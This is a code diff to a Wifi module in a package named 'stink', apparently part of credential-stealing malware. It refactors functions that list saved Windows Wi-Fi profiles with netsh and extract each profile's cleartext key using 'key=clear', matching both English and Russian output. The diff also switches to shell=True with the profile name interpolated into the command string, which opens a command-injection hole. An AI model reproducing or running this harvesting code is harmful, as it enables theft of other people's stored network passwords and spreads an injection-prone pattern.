@@ -1,7 +1,7 @@
 from os import path
 from typing import List
 import subprocess
-import chardet
+from chardet import detect as chardet_detect
 
 from stink.helpers import functions, MemoryStorage
 
@@ -13,22 +13,24 @@ class Wifi:
 
     @staticmethod
     def decode_text(text):
-        return text.decode(encoding=chardet.detect(text)["encoding"], errors="ignore")
+        return text.decode(encoding=chardet_detect(text)["encoding"], errors="ignore")
 
     @staticmethod
     def get_wifi_profiles() -> List[str]:
         def decode_text(text):
             return text.decode(
-                encoding=chardet.detect(text)["encoding"], errors="ignore"
+                encoding=chardet_detect(text)["encoding"], errors="ignore"
             )
 
         def _any(cmd_result):
             KEY_CONTENT = ["All User Profile", "Все профили пользователей"]
             return any(keyword in cmd_result for keyword in KEY_CONTENT)
 
-        cmd_results = decode_text(
-            subprocess.check_output("netsh wlan show profiles")
-        ).split("\r\n")
+        process = subprocess.Popen(
+            "netsh wlan show profiles", shell=True, stdout=subprocess.PIPE
+        )
+        output, _ = process.communicate()
+        cmd_results = decode_text(output).split("\r\n")
         profiles = [
             cmd_result.split(": ")[-1] for cmd_result in cmd_results if _any(cmd_result)
         ]
@@ -38,16 +40,20 @@ class Wifi:
     def extract_wifi_password(profile: str) -> str:
         def decode_text(text):
             return text.decode(
-                encoding=chardet.detect(text)["encoding"], errors="ignore"
+                encoding=chardet_detect(text)["encoding"], errors="ignore"
             )
 
         def _any(cmd_result):
             KEY_CONTENT = ["Key Content", "Содержимое ключа"]
             return any(keyword in cmd_result for keyword in KEY_CONTENT)
 
-        cmd_results = decode_text(
-            subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear')
-        ).split("\r\n")
+        process = subprocess.Popen(
+            f'netsh wlan show profile "{profile}" key=clear',
+            shell=True,
+            stdout=subprocess.PIPE,
+        )
+        output, _ = process.communicate()
+        cmd_results = decode_text(output).split("\r\n")
         password = [
             cmd_result.split(":")[1][:]
             for cmd_result in cmd_results
